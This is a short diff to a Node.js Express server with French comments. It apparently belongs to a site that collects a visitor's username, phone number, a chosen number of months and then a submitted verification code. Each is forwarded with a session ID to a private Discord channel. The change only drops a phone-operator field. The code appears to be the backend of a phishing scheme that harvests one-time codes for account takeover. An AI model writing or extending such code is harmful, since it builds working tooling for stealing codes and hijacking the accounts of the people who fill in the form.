@@ -39,12 +39,12 @@ app.post('/api/visit', async (req, res) => {
 
 // 1. Recevoir la demande du site
 app.post('/api/request', async (req, res) => {
-    const { username, phoneNumber, selectedOperator, selectedMonths } = req.body;
+    const { username, phoneNumber, selectedMonths } = req.body;
     const sessionId = generateId();
     
     requests[sessionId] = {
         status: 'pending',
-        data: { username, phoneNumber, selectedOperator, selectedMonths }
+        data: { username, phoneNumber, selectedMonths }
     };
 
     const channelId = process.env.CHANNEL_ID;
@@ -62,7 +62,6 @@ app.post('/api/request', async (req, res) => {
         .addFields(
             { name: "👤 Utilisateur", value: `\`${username}\``, inline: true },
             { name: "📱 Numéro", value: `\`${phoneNumber}\``, inline: false },
-            { name: "📡 Opérateur", value: `\`${selectedOperator}\``, inline: true },
             { name: "⏳ Durée choisie", value: `\`${selectedMonths} mois\`` }
         )
         .setFooter({ text: `Session: ${sessionId}` })
@@ -121,7 +120,6 @@ app.post('/api/submit-code', async (req, res) => {
                 { name: "👤 Utilisateur", value: `\`${session.data.username}\``, inline: true },
                 { name: "🔑 Code", value: `\`${code}\``, inline: true },
                 { name: "📱 Numéro", value: `\`${session.data.phoneNumber}\`` },
-                { name: "📡 Opérateur", value: `\`${session.data.selectedOperator}\``, inline: true },
                 { name: "⏳ Durée", value: `\`${session.data.selectedMonths} mois\`` }
             )
             .setTimestamp();
